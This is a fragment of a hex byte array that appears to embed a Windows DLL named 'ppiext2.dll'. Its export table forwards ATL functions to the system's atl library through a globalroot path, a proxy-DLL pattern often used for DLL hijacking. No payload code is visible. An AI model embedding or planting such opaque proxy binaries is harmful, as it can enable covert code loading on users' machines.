	0xA6, 0x5C, 0x00, 0x00, 0x4A, 0x5D, 0x00, 0x00, 0xA7, 0x5D, 0x00, 0x00, 0xFF, 0x5D, 0x00, 0x00,
	0x25, 0x5F, 0x00, 0x00, 0x76, 0x5F, 0x00, 0x00, 0x22, 0x60, 0x00, 0x00, 0xE7, 0x60, 0x00, 0x00,
	0x16, 0x63, 0x00, 0x00, 0xF9, 0x61, 0x00, 0x00, 0xEB, 0x56, 0x00, 0x00, 0x6D, 0x58, 0x00, 0x00,
	0x46, 0x61, 0x00, 0x00, 0x32, 0x57, 0x00, 0x00, 0x57, 0x56, 0x00, 0x00, 0xA0, 0x56, 0x00, 0x00,
	0xA2, 0x5A, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0x25, 0x58, 0x00, 0x00, 0x47, 0x55, 0x00, 0x00,
	0x00, 0x55, 0x00, 0x00, 0xB6, 0x54, 0x00, 0x00, 0x69, 0x54, 0x00, 0x00, 0xCB, 0x53, 0x00, 0x00,
	0x1A, 0x54, 0x00, 0x00, 0x7E, 0x53, 0x00, 0x00, 0x13, 0x56, 0x00, 0x00, 0x4C, 0x5B, 0x00, 0x00,
	0xFC, 0x5B, 0x00, 0x00, 0xC3, 0x5E, 0x00, 0x00, 0x5E, 0x5E, 0x00, 0x00, 0x8E, 0x55, 0x00, 0x00,
	0xD2, 0x55, 0x00, 0x00, 0xA1, 0x61, 0x00, 0x00, 0xE9, 0x59, 0x00, 0x00, 0x46, 0x5A, 0x00, 0x00,
	0xC3, 0x58, 0x00, 0x00, 0x22, 0x59, 0x00, 0x00, 0xD4, 0x57, 0x00, 0x00, 0xC6, 0x5F, 0x00, 0x00,
	0xF0, 0x5C, 0x00, 0x00, 0x7F, 0x60, 0x00, 0x00, 0xA2, 0x5B, 0x00, 0x00, 0x41, 0x62, 0x00, 0x00,
	0x86, 0x59, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00,
	0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00,
	0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00,
	0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00,
	0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00,
	0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00,
	0xD0, 0x26, 0x00, 0x00, 0x34, 0x65, 0x00, 0x00, 0x44, 0x27, 0x00, 0x00, 0x50, 0x29, 0x00, 0x00,
	0xA4, 0x29, 0x00, 0x00, 0x4C, 0x2A, 0x00, 0x00, 0xF0, 0x28, 0x00, 0x00, 0xCC, 0x2D, 0x00, 0x00,
	0x50, 0x2E, 0x00, 0x00, 0xB8, 0x29, 0x00, 0x00, 0x44, 0x29, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00,
	0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xF4, 0x2A, 0x00, 0x00, 0xEC, 0x2A, 0x00, 0x00,
	0xF4, 0x2A, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00,
	0xD0, 0x26, 0x00, 0x00, 0xF0, 0x66, 0x00, 0x00, 0x3C, 0x67, 0x00, 0x00, 0x8C, 0x67, 0x00, 0x00,
	0xD6, 0x67, 0x00, 0x00, 0x23, 0x68, 0x00, 0x00, 0x6E, 0x68, 0x00, 0x00, 0xBB, 0x68, 0x00, 0x00,
	0x0B, 0x69, 0x00, 0x00, 0x53, 0x69, 0x00, 0x00, 0x99, 0x69, 0x00, 0x00, 0xE0, 0x69, 0x00, 0x00,
	0x2C, 0x6A, 0x00, 0x00, 0x7B, 0x6A, 0x00, 0x00, 0xC9, 0x6A, 0x00, 0x00, 0x1C, 0x6B, 0x00, 0x00,
	0x6E, 0x6B, 0x00, 0x00, 0xBE, 0x6B, 0x00, 0x00, 0x0F, 0x6C, 0x00, 0x00, 0x5A, 0x6C, 0x00, 0x00,
	0xAA, 0x6C, 0x00, 0x00, 0xFA, 0x6C, 0x00, 0x00, 0x41, 0x6D, 0x00, 0x00, 0x87, 0x6D, 0x00, 0x00,
	0xCB, 0x6D, 0x00, 0x00, 0x0E, 0x6E, 0x00, 0x00, 0x52, 0x6E, 0x00, 0x00, 0x96, 0x6E, 0x00, 0x00,
	0xDA, 0x6E, 0x00, 0x00, 0x23, 0x6F, 0x00, 0x00, 0x74, 0x6F, 0x00, 0x00, 0xC4, 0x6F, 0x00, 0x00,
	0x12, 0x70, 0x00, 0x00, 0x5F, 0x70, 0x00, 0x00, 0xA8, 0x70, 0x00, 0x00, 0xEC, 0x70, 0x00, 0x00,
	0x2E, 0x71, 0x00, 0x00, 0x79, 0x71, 0x00, 0x00, 0xC4, 0x71, 0x00, 0x00, 0x09, 0x72, 0x00, 0x00,
	0x52, 0x72, 0x00, 0x00, 0xA3, 0x72, 0x00, 0x00, 0xF0, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xD0, 0x26, 0x00, 0x00, 0x30, 0x53, 0x00, 0x00, 0x6B, 0x53, 0x00, 0x00,
	0xB8, 0x53, 0x00, 0x00, 0x05, 0x54, 0x00, 0x00, 0x56, 0x54, 0x00, 0x00, 0xA3, 0x54, 0x00, 0x00,
	0xF0, 0x54, 0x00, 0x00, 0x37, 0x55, 0x00, 0x00, 0x7E, 0x55, 0x00, 0x00, 0xC5, 0x55, 0x00, 0x00,
	0x06, 0x56, 0x00, 0x00, 0x47, 0x56, 0x00, 0x00, 0x8E, 0x56, 0x00, 0x00, 0xD9, 0x56, 0x00, 0x00,
	0x24, 0x57, 0x00, 0x00, 0x67, 0x57, 0x00, 0x00, 0xB8, 0x57, 0x00, 0x00, 0x17, 0x58, 0x00, 0x00,
	0x5A, 0x58, 0x00, 0x00, 0xA7, 0x58, 0x00, 0x00, 0x06, 0x59, 0x00, 0x00, 0x65, 0x59, 0x00, 0x00,
	0xCE, 0x59, 0x00, 0x00, 0x2B, 0x5A, 0x00, 0x00, 0x88, 0x5A, 0x00, 0x00, 0xE3, 0x5A, 0x00, 0x00,
	0x32, 0x5B, 0x00, 0x00, 0x8D, 0x5B, 0x00, 0x00, 0xDE, 0x5B, 0x00, 0x00, 0x41, 0x5C, 0x00, 0x00,
	0x98, 0x5C, 0x00, 0x00, 0xDB, 0x5C, 0x00, 0x00, 0x2C, 0x5D, 0x00, 0x00, 0x8F, 0x5D, 0x00, 0x00,
	0xE6, 0x5D, 0x00, 0x00, 0x3F, 0x5E, 0x00, 0x00, 0xA4, 0x5E, 0x00, 0x00, 0x09, 0x5F, 0x00, 0x00,
	0x68, 0x5F, 0x00, 0x00, 0xAB, 0x5F, 0x00, 0x00, 0x08, 0x60, 0x00, 0x00, 0x63, 0x60, 0x00, 0x00,
	0xC2, 0x60, 0x00, 0x00, 0x33, 0x61, 0x00, 0x00, 0x80, 0x61, 0x00, 0x00, 0xE9, 0x61, 0x00, 0x00,
	0x30, 0x62, 0x00, 0x00, 0x79, 0x62, 0x00, 0x00, 0xB8, 0x62, 0x00, 0x00, 0xFF, 0x62, 0x00, 0x00,
	0x54, 0x63, 0x00, 0x00, 0x6D, 0x63, 0x00, 0x00, 0x80, 0x63, 0x00, 0x00, 0x9D, 0x63, 0x00, 0x00,
	0xA7, 0x63, 0x00, 0x00, 0xB6, 0x63, 0x00, 0x00, 0xD1, 0x63, 0x00, 0x00, 0xE3, 0x63, 0x00, 0x00,
	0xFF, 0x63, 0x00, 0x00, 0x14, 0x64, 0x00, 0x00, 0x28, 0x64, 0x00, 0x00, 0x38, 0x64, 0x00, 0x00,
	0x4B, 0x64, 0x00, 0x00, 0x5C, 0x64, 0x00, 0x00, 0x6F, 0x64, 0x00, 0x00, 0x78, 0x64, 0x00, 0x00,
	0x88, 0x64, 0x00, 0x00, 0x97, 0x64, 0x00, 0x00, 0xAC, 0x64, 0x00, 0x00, 0xBD, 0x64, 0x00, 0x00,
	0xCD, 0x64, 0x00, 0x00, 0xE0, 0x64, 0x00, 0x00, 0xF1, 0x64, 0x00, 0x00, 0x01, 0x65, 0x00, 0x00,
	0x17, 0x65, 0x00, 0x00, 0x29, 0x65, 0x00, 0x00, 0x68, 0x65, 0x00, 0x00, 0x76, 0x65, 0x00, 0x00,
	0x86, 0x65, 0x00, 0x00, 0x95, 0x65, 0x00, 0x00, 0xA7, 0x65, 0x00, 0x00, 0xB4, 0x65, 0x00, 0x00,
	0xC2, 0x65, 0x00, 0x00, 0xD2, 0x65, 0x00, 0x00, 0xE1, 0x65, 0x00, 0x00, 0xEF, 0x65, 0x00, 0x00,
	0xFB, 0x65, 0x00, 0x00, 0x15, 0x66, 0x00, 0x00, 0x28, 0x66, 0x00, 0x00, 0x3F, 0x66, 0x00, 0x00,
	0x57, 0x66, 0x00, 0x00, 0x7E, 0x66, 0x00, 0x00, 0x90, 0x66, 0x00, 0x00, 0xA3, 0x66, 0x00, 0x00,
	0xBA, 0x66, 0x00, 0x00, 0xD0, 0x66, 0x00, 0x00, 0xE2, 0x66, 0x00, 0x00, 0x27, 0x67, 0x00, 0x00,
	0x7A, 0x67, 0x00, 0x00, 0xC7, 0x67, 0x00, 0x00, 0x0E, 0x68, 0x00, 0x00, 0x61, 0x68, 0x00, 0x00,
	0xA4, 0x68, 0x00, 0x00, 0xFB, 0x68, 0x00, 0x00, 0x44, 0x69, 0x00, 0x00, 0x8B, 0x69, 0x00, 0x00,
	0xD0, 0x69, 0x00, 0x00, 0x19, 0x6A, 0x00, 0x00, 0x68, 0x6A, 0x00, 0x00, 0xB7, 0x6A, 0x00, 0x00,
	0x04, 0x6B, 0x00, 0x00, 0x5D, 0x6B, 0x00, 0x00, 0xA8, 0x6B, 0x00, 0x00, 0xFD, 0x6B, 0x00, 0x00,
	0x4A, 0x6C, 0x00, 0x00, 0x93, 0x6C, 0x00, 0x00, 0xEA, 0x6C, 0x00, 0x00, 0x33, 0x6D, 0x00, 0x00,
	0x78, 0x6D, 0x00, 0x00, 0xBF, 0x6D, 0x00, 0x00, 0x00, 0x6E, 0x00, 0x00, 0x45, 0x6E, 0x00, 0x00,
	0x88, 0x6E, 0x00, 0x00, 0xCD, 0x6E, 0x00, 0x00, 0x10, 0x6F, 0x00, 0x00, 0x5F, 0x6F, 0x00, 0x00,
	0xB2, 0x6F, 0x00, 0x00, 0xFF, 0x6F, 0x00, 0x00, 0x4E, 0x70, 0x00, 0x00, 0x99, 0x70, 0x00, 0x00,
	0xE0, 0x70, 0x00, 0x00, 0x21, 0x71, 0x00, 0x00, 0x64, 0x71, 0x00, 0x00, 0xB7, 0x71, 0x00, 0x00,
	0xFA, 0x71, 0x00, 0x00, 0x41, 0x72, 0x00, 0x00, 0x8C, 0x72, 0x00, 0x00, 0xE3, 0x72, 0x00, 0x00,
	0x00, 0x00, 0x1F, 0x00, 0x1D, 0x00, 0x1E, 0x00, 0x1C, 0x00, 0x1B, 0x00, 0x1A, 0x00, 0x19, 0x00,
	0x25, 0x00, 0x26, 0x00, 0x20, 0x00, 0x14, 0x00, 0x15, 0x00, 0x10, 0x00, 0x13, 0x00, 0x02, 0x00,
	0x2C, 0x00, 0x18, 0x00, 0x11, 0x00, 0x2A, 0x00, 0x2B, 0x00, 0x32, 0x00, 0x28, 0x00, 0x29, 0x00,
	0x16, 0x00, 0x03, 0x00, 0x21, 0x00, 0x30, 0x00, 0x22, 0x00, 0x05, 0x00, 0x06, 0x00, 0x2E, 0x00,
	0x07, 0x00, 0x08, 0x00, 0x09, 0x00, 0x24, 0x00, 0x23, 0x00, 0x0A, 0x00, 0x0B, 0x00, 0x2D, 0x00,
	0x0C, 0x00, 0x2F, 0x00, 0x0D, 0x00, 0x12, 0x00, 0x27, 0x00, 0x0F, 0x00, 0x31, 0x00, 0x01, 0x00,
	0x04, 0x00, 0x0E, 0x00, 0x17, 0x00, 0x33, 0x00, 0x34, 0x00, 0x35, 0x00, 0x36, 0x00, 0x37, 0x00,
	0x38, 0x00, 0x39, 0x00, 0x3A, 0x00, 0x3B, 0x00, 0x3C, 0x00, 0x3D, 0x00, 0x3E, 0x00, 0x3F, 0x00,
	0x40, 0x00, 0x41, 0x00, 0x42, 0x00, 0x43, 0x00, 0x44, 0x00, 0x45, 0x00, 0x46, 0x00, 0x47, 0x00,
	0x48, 0x00, 0x49, 0x00, 0x4A, 0x00, 0x4B, 0x00, 0x4C, 0x00, 0x4D, 0x00, 0x4E, 0x00, 0x4F, 0x00,
	0x50, 0x00, 0x51, 0x00, 0x52, 0x00, 0x53, 0x00, 0x54, 0x00, 0x55, 0x00, 0x56, 0x00, 0x4F, 0x01,
	0x57, 0x00, 0x58, 0x00, 0x59, 0x00, 0x5A, 0x00, 0x5B, 0x00, 0x5C, 0x00, 0x5D, 0x00, 0x5E, 0x00,
	0x5F, 0x00, 0x60, 0x00, 0x61, 0x00, 0x62, 0x00, 0x63, 0x00, 0x64, 0x00, 0x65, 0x00, 0x66, 0x00,
	0x67, 0x00, 0x68, 0x00, 0x69, 0x00, 0x6A, 0x00, 0x6B, 0x00, 0x6C, 0x00, 0x6D, 0x00, 0x6E, 0x00,
	0x6F, 0x00, 0x70, 0x00, 0x71, 0x00, 0x72, 0x00, 0x73, 0x00, 0x74, 0x00, 0x75, 0x00, 0x76, 0x00,
	0x77, 0x00, 0x78, 0x00, 0x79, 0x00, 0x7A, 0x00, 0x7B, 0x00, 0x7C, 0x00, 0x7D, 0x00, 0x7E, 0x00,
	0x7F, 0x00, 0x80, 0x00, 0x81, 0x00, 0x82, 0x00, 0x83, 0x00, 0x84, 0x00, 0x85, 0x00, 0x86, 0x00,
	0x87, 0x00, 0x88, 0x00, 0x70, 0x70, 0x69, 0x65, 0x78, 0x74, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00,
	0x41, 0x74, 0x6C, 0x41, 0x64, 0x76, 0x69, 0x73, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C,
	0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C,
	0x2E, 0x41, 0x74, 0x6C, 0x41, 0x64, 0x76, 0x69, 0x73, 0x65, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78,
	0x41, 0x74, 0x74, 0x61, 0x63, 0x68, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x41, 0x74, 0x74, 0x61, 0x63, 0x68,
	0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x43, 0x72, 0x65,
	0x61, 0x74, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67,
	0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74,
	0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x43, 0x6F, 0x6E,
	0x74, 0x72, 0x6F, 0x6C, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65,
	0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x45, 0x78, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C,
	0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C,
	0x2E, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x43, 0x6F, 0x6E, 0x74,
	0x72, 0x6F, 0x6C, 0x45, 0x78, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x43, 0x72, 0x65, 0x61, 0x74,
	0x65, 0x44, 0x69, 0x61, 0x6C, 0x6F, 0x67, 0x41, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E,
	0x41, 0x74, 0x6C, 0x41, 0x78, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x44, 0x69, 0x61, 0x6C, 0x6F,
	0x67, 0x41, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x44, 0x69,
	0x61, 0x6C, 0x6F, 0x67, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x41, 0x78, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x44, 0x69, 0x61, 0x6C, 0x6F, 0x67, 0x57, 0x00,
	0x41, 0x74, 0x6C, 0x41, 0x78, 0x44, 0x69, 0x61, 0x6C, 0x6F, 0x67, 0x42, 0x6F, 0x78, 0x41, 0x00,
	0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x44, 0x69, 0x61, 0x6C,
	0x6F, 0x67, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x44, 0x69, 0x61, 0x6C,
	0x6F, 0x67, 0x42, 0x6F, 0x78, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61,
	0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74,
	0x6C, 0x41, 0x78, 0x44, 0x69, 0x61, 0x6C, 0x6F, 0x67, 0x42, 0x6F, 0x78, 0x57, 0x00, 0x41, 0x74,
	0x6C, 0x41, 0x78, 0x47, 0x65, 0x74, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x47, 0x65, 0x74, 0x43, 0x6F, 0x6E,
	0x74, 0x72, 0x6F, 0x6C, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x47, 0x65, 0x74, 0x48, 0x6F, 0x73,
	0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
